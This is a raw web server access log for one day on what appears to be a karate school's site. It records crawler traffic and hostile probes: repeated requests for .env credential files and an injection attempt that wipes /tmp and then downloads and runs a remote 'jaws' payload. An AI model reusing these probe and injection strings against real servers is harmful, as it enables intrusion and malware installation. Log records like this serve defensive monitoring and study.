::ffff:40.77.167.188 - - [08/Apr/2023:08:08:57 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:198.71.226.19 - - [08/Apr/2023:08:15:43 +0000] "GET /wordpress/ HTTP/1.1" 404 149 "-" "-"
::ffff:71.136.232.229 - - [08/Apr/2023:08:19:30 +0000] "GET /linear-swap-ws HTTP/1.1" 404 153 "-" "Go-http-client/1.1"
::ffff:185.254.196.173 - - [08/Apr/2023:08:21:00 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.173 - - [08/Apr/2023:08:21:00 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:109.237.98.226 - - [08/Apr/2023:08:24:50 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:107.170.239.18 - - [08/Apr/2023:08:28:27 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:162.142.125.11 - - [08/Apr/2023:08:35:28 +0000] "GET / HTTP/1.1" 200 58146 "-" "-"
::ffff:162.142.125.11 - - [08/Apr/2023:08:35:28 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:135.125.244.48 - - [08/Apr/2023:08:37:02 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [08/Apr/2023:08:37:02 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:51.222.253.11 - - [08/Apr/2023:08:37:23 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:162.243.132.24 - - [08/Apr/2023:08:38:09 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:66.249.65.181 - - [08/Apr/2023:08:51:41 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:43.155.118.219 - - [08/Apr/2023:09:04:40 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:167.248.133.126 - - [08/Apr/2023:09:14:20 +0000] "GET / HTTP/1.1" 200 58146 "-" "-"
::ffff:167.248.133.126 - - [08/Apr/2023:09:14:20 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.248.133.126 - - [08/Apr/2023:09:14:20 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:167.248.133.126 - - [08/Apr/2023:09:14:20 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.248.133.126 - - [08/Apr/2023:09:14:26 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:172.58.89.22 - - [08/Apr/2023:09:20:09 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
::ffff:193.32.162.159 - - [08/Apr/2023:09:33:38 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:193.32.162.159 - - [08/Apr/2023:09:33:44 +0000] "GET /dispatch.asp HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:135.125.244.48 - - [08/Apr/2023:09:46:07 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [08/Apr/2023:09:46:07 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.65.185 - - [08/Apr/2023:09:49:28 +0000] "GET /images/instructors/JohnPWKK.jpg HTTP/1.1" 304 - "-" "Googlebot-Image/1.0"
::ffff:17.241.219.181 - - [08/Apr/2023:09:51:39 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
::ffff:17.241.219.181 - - [08/Apr/2023:09:51:39 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
::ffff:185.254.196.173 - - [08/Apr/2023:09:51:47 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.173 - - [08/Apr/2023:09:51:47 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:182.43.148.98 - - [08/Apr/2023:10:10:06 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
::ffff:66.249.65.185 - - [08/Apr/2023:10:10:12 +0000] "GET /images/instructors/SenseiLarry.jpg HTTP/1.1" 304 - "-" "Googlebot-Image/1.0"
::ffff:43.155.118.219 - - [08/Apr/2023:10:22:33 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:66.249.65.181 - - [08/Apr/2023:10:31:08 +0000] "GET /images/schools/zoomdonkaratedo.jpg HTTP/1.1" 304 - "-" "Googlebot-Image/1.0"
::ffff:79.133.51.221 - - [08/Apr/2023:10:31:24 +0000] "GET /sendgrid.env HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Linux; Android 12; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36"
::ffff:89.248.172.16 - - [08/Apr/2023:11:01:50 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
::ffff:89.248.172.16 - - [08/Apr/2023:11:02:25 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "-"
::ffff:89.248.172.16 - - [08/Apr/2023:11:02:26 +0000] "GET /sitemap.xml HTTP/1.1" 404 150 "-" "-"
::ffff:89.248.172.16 - - [08/Apr/2023:11:02:28 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 163 "-" "-"
::ffff:89.248.172.16 - - [08/Apr/2023:11:02:29 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
::ffff:185.254.196.173 - - [08/Apr/2023:11:21:08 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.173 - - [08/Apr/2023:11:21:08 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:216.244.66.196 - - [08/Apr/2023:11:29:09 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:45.56.108.128 - - [08/Apr/2023:11:31:03 +0000] "GET /systembc/password.php HTTP/1.0" 404 160 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
::ffff:216.244.66.196 - - [08/Apr/2023:11:32:35 +0000] "GET /schools HTTP/1.1" 200 97308 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:135.125.244.48 - - [08/Apr/2023:11:32:51 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [08/Apr/2023:11:32:51 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:216.244.66.196 - - [08/Apr/2023:11:35:55 +0000] "GET /contact?s=1&ss=8 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:43.155.118.219 - - [08/Apr/2023:11:40:17 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:54.36.149.101 - - [08/Apr/2023:11:47:42 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.10 - - [08/Apr/2023:11:47:43 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:45.79.181.179 - - [08/Apr/2023:11:50:56 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
::ffff:193.32.162.159 - - [08/Apr/2023:11:58:08 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:193.32.162.159 - - [08/Apr/2023:11:58:13 +0000] "GET /dispatch.asp HTTP/1.1" 404 151 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:52.167.144.88 - - [08/Apr/2023:12:09:08 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:54.36.112.44 - - [08/Apr/2023:12:13:56 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.112.44 - - [08/Apr/2023:12:13:56 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [08/Apr/2023:12:42:11 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [08/Apr/2023:12:42:11 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:66.249.65.139 - - [08/Apr/2023:12:50:30 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.139 - - [08/Apr/2023:12:50:30 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.146 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:162.142.125.14 - - [08/Apr/2023:12:51:04 +0000] "GET / HTTP/1.1" 200 58146 "-" "-"
::ffff:162.142.125.14 - - [08/Apr/2023:12:51:04 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:162.142.125.14 - - [08/Apr/2023:12:51:04 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:162.142.125.14 - - [08/Apr/2023:12:51:04 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:162.142.125.14 - - [08/Apr/2023:12:51:04 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:185.254.196.173 - - [08/Apr/2023:12:54:30 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.173 - - [08/Apr/2023:12:54:30 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:43.155.118.219 - - [08/Apr/2023:12:58:06 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:78.110.69.147 - - [08/Apr/2023:12:58:56 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::ffff:66.249.65.150 - - [08/Apr/2023:13:15:30 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.154 - - [08/Apr/2023:13:15:30 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:216.244.66.196 - - [08/Apr/2023:13:17:04 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:216.244.66.196 - - [08/Apr/2023:13:22:29 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:54.36.112.44 - - [08/Apr/2023:13:25:16 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.112.44 - - [08/Apr/2023:13:25:16 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:147.182.138.233 - - [08/Apr/2023:13:33:25 +0000] "GET /ab2g HTTP/1.1" 404 143 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:147.182.138.233 - - [08/Apr/2023:13:33:25 +0000] "GET /ab2h HTTP/1.1" 404 143 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:147.182.138.233 - - [08/Apr/2023:13:33:28 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
::ffff:147.182.138.233 - - [08/Apr/2023:13:33:28 +0000] "GET /t4 HTTP/1.1" 404 141 "-" "Mozilla/5.0"
::ffff:147.182.138.233 - - [08/Apr/2023:13:33:29 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
::ffff:66.249.65.139 - - [08/Apr/2023:13:35:30 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.64.225 - - [08/Apr/2023:13:41:31 +0000] "GET /schools HTTP/1.1" 200 97308 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.146 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.181 - - [08/Apr/2023:13:44:30 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.181 - - [08/Apr/2023:13:44:30 +0000] "GET /schools HTTP/1.1" 200 97308 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:52.167.144.88 - - [08/Apr/2023:14:09:03 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:52.167.144.88 - - [08/Apr/2023:14:11:14 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:136.62.6.142 - - [08/Apr/2023:14:13:44 +0000] "GET /resources HTTP/1.1" - - "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/111.0.5563.101 Mobile/15E148 Safari/604.1"
::ffff:66.249.65.149 - - [08/Apr/2023:14:15:30 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:43.155.118.219 - - [08/Apr/2023:14:16:18 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:185.254.196.173 - - [08/Apr/2023:14:22:39 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [08/Apr/2023:14:28:30 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [08/Apr/2023:14:28:30 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:114.119.146.41 - - [08/Apr/2023:14:31:06 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:124.235.138.103 - - [08/Apr/2023:14:38:37 +0000] "GET / HTTP/1.0" 200 58146 "-" "-"
::ffff:58.19.46.142 - - [08/Apr/2023:14:39:29 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
::ffff:180.95.238.153 - - [08/Apr/2023:14:39:30 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36"
::ffff:59.135.189.103 - - [08/Apr/2023:14:41:04 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+167.71.210.63/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:34.222.38.80 - - [08/Apr/2023:14:43:21 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:54.185.47.96 - - [08/Apr/2023:14:43:26 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:54.185.47.96 - - [08/Apr/2023:14:43:30 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.91.159.200 - - [08/Apr/2023:14:43:38 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:18.237.193.174 - - [08/Apr/2023:14:43:56 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.91.190.38 - - [08/Apr/2023:14:44:10 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.91.190.38 - - [08/Apr/2023:14:44:10 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.91.190.38 - - [08/Apr/2023:14:44:15 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:35.91.190.38 - - [08/Apr/2023:14:44:16 +0000] "GET / HTTP/1.1" 200 58146 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36"
::ffff:27.124.12.16 - - [08/Apr/2023:15:02:20 +0000] "GET /p/26602.html HTTP/1.1" 404 151 "/p/26602.html" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
::ffff:135.125.244.48 - - [08/Apr/2023:15:06:25 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [08/Apr/2023:15:06:26 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.112.44 - - [08/Apr/2023:15:10:54 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.112.44 - - [08/Apr/2023:15:10:54 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:205.210.31.28 - - [08/Apr/2023:15:12:00 +0000] "GET / HTTP/1.1" 200 58146 "-" "-"
::ffff:66.249.65.181 - - [08/Apr/2023:15:14:30 +0000] "GET /schools HTTP/1.1" 200 97308 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.146 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:43.155.118.219 - - [08/Apr/2023:15:35:19 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:103.44.173.182 - - [08/Apr/2023:15:36:38 +0000] "GET / HTTP/1.0" 200 58146 "-" "-"
::ffff:103.44.173.182 - - [08/Apr/2023:15:36:45 +0000] "GET / HTTP/1.0" 200 58146 "-" "-"
::ffff:103.44.173.182 - - [08/Apr/2023:15:40:58 +0000] "GET / HTTP/1.0" 200 58146 "-" "-"
::ffff:103.44.173.182 - - [08/Apr/2023:15:41:00 +0000] "GET /nmaplowercheck1680968456 HTTP/1.1" 404 163 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
::ffff:103.44.173.182 - - [08/Apr/2023:15:41:03 +0000] "GET /HNAP1 HTTP/1.1" 404 144 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
::ffff:103.44.173.182 - - [08/Apr/2023:15:41:05 +0000] "GET /evox/about HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
::ffff:103.44.173.182 - - [08/Apr/2023:15:41:08 +0000] "POST /sdk HTTP/1.1" 404 143 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
::ffff:103.44.173.182 - - [08/Apr/2023:15:41:10 +0000] "POST /sdk HTTP/1.1" 404 143 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
::ffff:103.44.173.182 - - [08/Apr/2023:15:41:29 +0000] "GET /evox/about HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
::ffff:103.44.173.182 - - [08/Apr/2023:15:41:30 +0000] "GET /HNAP1 HTTP/1.1" 404 144 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
::ffff:103.44.173.182 - - [08/Apr/2023:15:41:50 +0000] "GET / HTTP/1.0" 200 58146 "-" "-"
::ffff:103.44.173.182 - - [08/Apr/2023:15:41:51 +0000] "GET / HTTP/1.1" 200 58146 "-" "-"
::ffff:103.44.173.182 - - [08/Apr/2023:15:42:01 +0000] "GET / HTTP/1.0" 200 58146 "-" "-"
::ffff:103.44.173.182 - - [08/Apr/2023:15:42:03 +0000] "GET / HTTP/1.1" 200 58146 "-" "-"
::ffff:66.249.65.183 - - [08/Apr/2023:15:45:30 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
